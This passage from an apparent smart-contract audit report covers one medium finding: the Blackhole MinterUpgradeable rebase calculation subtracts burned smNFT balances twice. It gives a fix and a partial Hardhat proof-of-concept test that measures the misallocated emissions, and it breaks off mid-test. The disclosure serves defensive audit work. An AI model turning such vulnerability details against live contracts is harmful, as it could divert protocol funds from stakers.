<h1 style="position:relative;" id="medium-risk-findings-13"><a class="anchor before" aria-label="medium risk findings 13 permalink" href="#medium-risk-findings-13"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Medium Risk Findings (13)</h1>
<h2 style="position:relative;" id="m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment"><a class="anchor before" aria-label="m 01 minterupgradeable double subtracting smnft burns causes rebase underpayment permalink" href="#m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-16">[M-01] <code>MinterUpgradeable</code>: double-subtracting smNFT burns causes rebase underpayment</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-17">lonelybones</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-9">Akxai</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-383">codexNature</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-417">hakunamatata</a>, and <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-252">holtzzx</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L297">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L297</a></p>
<h3 style="position:relative;" id="finding-description-and-impact"><a class="anchor before" aria-label="finding description and impact permalink" href="#finding-description-and-impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p><strong>Root Cause:</strong> Incorrect <code>circulatingBlack</code> calculation in <code>MinterUpgradeable.calculate_rebase()</code></p>
<p>The <code>MinterUpgradeable.calculate_rebase()</code> function (<a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L132"><code>contracts/MinterUpgradeable.sol#L132</code></a>) incorrectly calculates <code>circulatingBlack</code> when Supermassive NFTs (smNFTs) are present.</p>
<ol>
<li><strong>smNFT Creation Burns <code>BLACK</code>:</strong> <code>BLACK</code> tokens are burned when smNFTs are created/augmented in <code>VotingEscrow.sol</code> (e.g., <a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L796"><code>contracts/VotingEscrow.sol#L796</code></a>, <a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L933"><code>#L933</code></a>). This correctly reduces <code>BLACK.totalSupply()</code> (<a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/Black.sol#L97"><code>contracts/Black.sol#L97</code></a>).</li>
<li><strong><code>_blackTotal</code> is Post-Burn Supply:</strong> <code>MinterUpgradeable.calculate_rebase()</code> reads this already-reduced <code>totalSupply</code> into <code>_blackTotal</code> (<a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L127"><code>contracts/MinterUpgradeable.sol#L127</code></a>).</li>
<li><strong>Double Subtraction Flaw:</strong> The calculation for <code>circulatingBlack</code> effectively becomes <code>_blackTotal - _veTotal - _smNFTBalance</code>. Since <code>_blackTotal</code> is already net of the burned <code>_smNFTBalance</code>, <code>_smNFTBalance</code> is erroneously subtracted twice.</li>
</ol>
<h3 style="position:relative;" id="impact-1"><a class="anchor before" aria-label="impact 1 permalink" href="#impact-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Misallocation of minted emissions (high severity): this double-subtraction results in an artificially low <code>circulatingBlack</code> value. The rebase formula (<code>Rebase ~ _weeklyMint * (circulatingBlack / blackSupply)^2 / 2</code>) is highly sensitive to this error.</p>
<ul>
<li><strong>Understated Rebase:</strong> The <code>rebaseAmount</code> paid to <code>RewardsDistributor</code> (for LPs/stakers) is significantly lower than intended.</li>
<li><strong>Overstated Gauge Emissions:</strong> Consequently, emissions allocated to gauges (<code>_gauge = _emission - _rebase - _teamEmissions</code>) are significantly overstated.</li>
<li><strong>Economic Imbalance:</strong> This systematically diverts value from LPs/stakers to <code>veBLACK</code> voters who direct gauge emissions, undermining the protocol’s economic model. The misallocation is persistent and scales with the total <code>_smNFTBalance</code>.</li>
</ul>
<p>The Proof of Concept demonstrates this flaw, leading to a tangible misdirection of emissions each epoch. This directly affects a new core feature (smNFTs) and critical system logic.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-2"><a class="anchor before" aria-label="recommended mitigation steps 2 permalink" href="#recommended-mitigation-steps-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Correct the <code>circulatingBlack</code> calculation in <code>MinterUpgradeable.calculate_rebase()</code> (<a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L132"><code>contracts/MinterUpgradeable.sol#L132</code></a>).</p>
<p>Given <code>_blackTotal = _black.totalSupply()</code> (already reduced by smNFT burns) and <code>_veTotal = _black.balanceOf(address(_ve))</code>:</p>
<p><strong>Corrected <code>circulatingBlack</code> calculation:</strong></p>
<pre data-index="12" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// In MinterUpgradeable.calculate_rebase()</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">circulatingBlack_corrected</span><span class="mtk1"> = </span><span class="mtk12">_blackTotal</span><span class="mtk1"> - </span><span class="mtk12">_veTotal</span><span class="mtk1">;</span></span></span></code></pre>
<p>This ensures <code>_smNFTBalance</code> (representing tokens already removed from <code>_blackTotal</code>) is not subtracted again. The blackSupply denominator (<code>_blackTotal + _superMassiveBonus</code>) can remain, as it reflects an effective total supply including smNFT bonus effects.</p>
<h3 style="position:relative;" id="proof-of-concept-2"><a class="anchor before" aria-label="proof of concept 2 permalink" href="#proof-of-concept-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>A Hardhat test (<code>test/poc-rebase-miscalculation.js</code>), utilizing necessary mock contracts, has been developed to demonstrate the vulnerability.</p>
<p>The PoC executes the following key steps:</p>
<ol>
<li>Deploys core contracts (<code>Black</code>, <code>VotingEscrow</code>, <code>MinterUpgradeable</code>) and required mocks.</li>
<li>Creates both a standard veNFT lock and a Supermassive NFT (smNFT), triggering the <code>BLACK</code> token burn for the smNFT.</li>
<li>Advances time to enable a new minting period via <code>MinterUpgradeable.update_period()</code>.</li>
<li><strong>Compares rebase calculations:</strong> It invokes <code>MinterUpgradeable.calculate_rebase()</code> and compares this value to a manually corrected calculation that rectifies the double-subtraction of <code>_smNFTBalance</code>.</li>
<li>
<p><strong>Verifies emission misallocation:</strong> It calls <code>MinterUpgradeable.update_period()</code> to perform the actual minting and distribution. It then asserts that:</p>
<ul>
<li>The <code>BLACK</code> tokens transferred to the (mocked) <code>RewardsDistributor</code> match the contract’s flawed, lower rebase calculation.</li>
<li>The <code>BLACK</code> tokens approved for the (mocked) <code>GaugeManager</code> are consequently higher than they would be with a correct rebase, and this excess precisely matches the amount miscalculated from the rebase.</li>
</ul>
</li>
</ol>
<p>Key findings demonstrated by the PoC:</p>
<ul>
<li>The contract’s <code>calculate_rebase()</code> function yields a significantly lower rebase amount than the correctly calculated value when <code>_smNFTBalance &gt; 0</code>.</li>
<li>This understated rebase amount is what is actually distributed.</li>
<li>The difference (the “misallocated amount”) is verifiably diverted towards gauge emissions.</li>
</ul>
<p>The full PoC script and mock contracts will be provided below. The test passes and includes detailed console logs to trace the state and calculations.</p>
<p><strong><code>poc_rebase_miscalculation.js</code>:</strong></p>
<details>
<pre data-index="13" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">const { expect } = require("chai");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const { ethers, network } = require("hardhat");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">describe("MinterUpgradeable - Rebase Miscalculation PoC", function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let deployer, user1, team; // Signers</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let blackToken, votingEscrow, minter, gaugeManagerMock, rewardsDistributorMock, blackGovernorMock;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let votingBalanceLogic, votingDelegationLib; // Libraries</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const WEEK = 1800; </span></span>
<span class="grvsc-line"><span class="grvsc-source">    const PRECISION = ethers.BigNumber.from("10000");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const TOKEN_DECIMALS = 18; // For formatting ethers</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    async function setupContracts() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        [deployer, user1, team] = await ethers.getSigners();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const BlackFactory = await ethers.getContractFactory("Black");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        blackToken = await BlackFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (!(await blackToken.initialMinted())) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            await blackToken.connect(deployer).initialMint(deployer.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const initialUserTokens = ethers.utils.parseEther("1000000");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(deployer).transfer(user1.address, initialUserTokens);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const VotingBalanceLogicFactory = await ethers.getContractFactory("VotingBalanceLogic");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        votingBalanceLogic = await VotingBalanceLogicFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingBalanceLogic.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const VotingDelegationLibFactory = await ethers.getContractFactory("VotingDelegationLib");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        votingDelegationLib = await VotingDelegationLibFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingDelegationLib.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const VotingEscrowFactory = await ethers.getContractFactory("VotingEscrow", {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            libraries: { VotingBalanceLogic: votingBalanceLogic.address },</span></span>
<span class="grvsc-line"><span class="grvsc-source">        });</span></span>
<span class="grvsc-line"><span class="grvsc-source">        votingEscrow = await VotingEscrowFactory.deploy(blackToken.address, ethers.constants.AddressZero, ethers.constants.AddressZero);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if ((await votingEscrow.team()) !== team.address) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            await votingEscrow.connect(deployer).setTeam(team.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const GaugeManagerMockFactory = await ethers.getContractFactory("GaugeManagerMock");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        gaugeManagerMock = await GaugeManagerMockFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeManagerMock.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const RewardsDistributorMockFactory = await ethers.getContractFactory("RewardsDistributorMock");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        rewardsDistributorMock = await RewardsDistributorMockFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await rewardsDistributorMock.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const BlackGovernorMockFactory = await ethers.getContractFactory("BlackGovernorMock");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        blackGovernorMock = await BlackGovernorMockFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackGovernorMock.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeManagerMock.setBlackGovernor(blackGovernorMock.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const MinterFactory = await ethers.getContractFactory("MinterUpgradeable");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        minter = await MinterFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await minter.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await minter.connect(deployer).initialize(gaugeManagerMock.address, votingEscrow.address, rewardsDistributorMock.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if ((await minter.team()) !== team.address) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            await minter.connect(deployer).setTeam(team.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            await minter.connect(team).acceptTeam();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await minter.connect(deployer)._initialize([], [], 0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(deployer).setMinter(minter.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(user1).approve(votingEscrow.address, ethers.constants.MaxUint256);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    async function advanceToNextMintingPeriod(minterContract) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let currentActivePeriod = await minterContract.active_period();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let currentTime = ethers.BigNumber.from((await ethers.provider.getBlock('latest')).timestamp);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let targetTimeForUpdate = currentActivePeriod.add(WEEK);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (currentTime.lt(targetTimeForUpdate)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            const timeToAdvance = targetTimeForUpdate.sub(currentTime).toNumber();</span></span>
<span class="grvsc-line"><span class="grvsc-source">            if (timeToAdvance &gt; 0) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                await network.provider.send("evm_increaseTime", [timeToAdvance]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await network.provider.send("evm_mine"); // Mine a block regardless to update timestamp</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Helper function to format BigNumbers consistently for logging</span></span>
<span class="grvsc-line"><span class="grvsc-source">    function formatBN(bn) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return ethers.utils.formatUnits(bn, TOKEN_DECIMALS);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    it("should have correct rebase when smNFTBalance is zero", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await setupContracts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const lockAmount = ethers.utils.parseEther("10000");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const lockDuration = WEEK * 52;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.connect(user1).create_lock(lockAmount, lockDuration, false /* isSMNFT */);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        await advanceToNextMintingPeriod(minter);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const veTotal = await blackToken.balanceOf(votingEscrow.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const blackTotal = await blackToken.totalSupply();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const smNFTBalance = await votingEscrow.smNFTBalance();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const superMassiveBonus = await votingEscrow.calculate_sm_nft_bonus(smNFTBalance);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const weeklyEmission = await minter.weekly();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("\n--- Test Case: smNFTBalance is ZERO ---");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  veTotal:", formatBN(veTotal));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  blackTotal:", formatBN(blackTotal));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  smNFTBalance:", formatBN(smNFTBalance)); // Should be 0</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  superMassiveBonus:", formatBN(superMassiveBonus)); // Should be 0</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Weekly Mint:", formatBN(weeklyEmission));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const rebaseContract = await minter.calculate_rebase(weeklyEmission);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Rebase (Contract):", formatBN(rebaseContract));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Corrected calculation (should match contract when smNFTBalance is 0)</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Contract's circulatingBlack = blackTotal - veTotal - smNFTBalance</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Corrected circulatingBlack = blackTotal - veTotal</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Since smNFTBalance is 0, these are the same.</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const correctedCirculating = blackTotal.sub(veTotal);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const correctedDenominator = blackTotal.add(superMassiveBonus); // bonus is 0</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        let correctedRebase = ethers.BigNumber.from(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (!correctedDenominator.isZero() &amp;&amp; correctedCirculating.gte(0)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            const numSq = correctedCirculating.mul(correctedCirculating);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            const denSqTimes2 = correctedDenominator.mul(correctedDenominator).mul(2);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            if(!denSqTimes2.isZero()) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                correctedRebase = weeklyEmission.mul(numSq).div(denSqTimes2);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Rebase (Corrected):", formatBN(correctedRebase));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(smNFTBalance).to.equal(0, "smNFTBalance should be zero for this test case");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const diff = rebaseContract.sub(correctedRebase).abs();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Allow for extremely small dust if any fixed point math slightly differs, though should be equal</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const tolerance = ethers.utils.parseUnits("1", "wei"); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(diff).to.be.lte(tolerance, "Rebase calculations should be identical when smNFTBalance is zero");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    });</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">it("should demonstrate rebase miscalculation when smNFTBalance is positive", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await setupContracts(); // Ensure fresh state for this test</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const lockAmount = ethers.utils.parseEther("10000"); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const smNFTLockAmount = ethers.utils.parseEther("50000"); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const lockDuration = WEEK * 52 * 1; </span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.connect(user1).create_lock(lockAmount, lockDuration, false /* isSMNFT */);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.connect(user1).create_lock(smNFTLockAmount, lockDuration, true /* isSMNFT */);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        await advanceToNextMintingPeriod(minter);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const veTotal_before = await blackToken.balanceOf(votingEscrow.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const blackTotal_before = await blackToken.totalSupply(); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const smNFTBalance_before = await votingEscrow.smNFTBalance(); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const superMassiveBonus_before = await votingEscrow.calculate_sm_nft_bonus(smNFTBalance_before);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const weeklyEmission_for_period = await minter.weekly(); </span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("\n--- Test Case: smNFTBalance is POSITIVE ---");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("State BEFORE Minter.update_period / calculate_rebase (Revised Inputs):");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  veTotal (tokens in VE for normal/perm locks):", formatBN(veTotal_before));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  blackTotal (actual totalSupply after smNFT burn):", formatBN(blackTotal_before));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  smNFTBalance (sum of original principals burned for smNFTs):", formatBN(smNFTBalance_before));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  superMassiveBonus (conceptual bonus on smNFTBalance):", formatBN(superMassiveBonus_before));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Weekly Mint for this period (emission to be distributed):", formatBN(weeklyEmission_for_period));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const rebaseAmount_from_contract_calc = await minter.calculate_rebase(weeklyEmission_for_period);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Rebase Amount calculated BY CONTRACT'S LOGIC:", formatBN(rebaseAmount_from_contract_calc));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Corrected Logic: circulatingBlack should NOT double-subtract smNFTBalance</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const corrected_circulatingBlack = blackTotal_before.sub(veTotal_before); // Numerator: BT - VT</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Corrected Denominator: actual total supply + conceptual bonus</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const corrected_blackSupply_denominator = blackTotal_before.add(superMassiveBonus_before); // Denominator: BT + B</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("\nFor Manual/Corrected Calculation:");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Corrected Circulating Black (ActualCirculating):", formatBN(corrected_circulatingBlack));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Corrected Black Supply Denominator (ActualTotalSupply + Bonus):", formatBN(corrected_blackSupply_denominator));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        let corrected_rebaseAmount = ethers.BigNumber.from(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (!corrected_blackSupply_denominator.isZero() &amp;&amp; corrected_circulatingBlack.gte(0)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            const num_squared = corrected_circulatingBlack.mul(corrected_circulatingBlack);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            const den_squared_times_2 = corrected_blackSupply_denominator.mul(corrected_blackSupply_denominator).mul(2);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            if (!den_squared_times_2.isZero()) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                 corrected_rebaseAmount = weeklyEmission_for_period.mul(num_squared).div(den_squared_times_2);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Rebase Amount calculated MANUALLY (Corrected Logic):", formatBN(corrected_rebaseAmount));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const expected_misallocated_rebase = corrected_rebaseAmount.sub(rebaseAmount_from_contract_calc);</span></span>
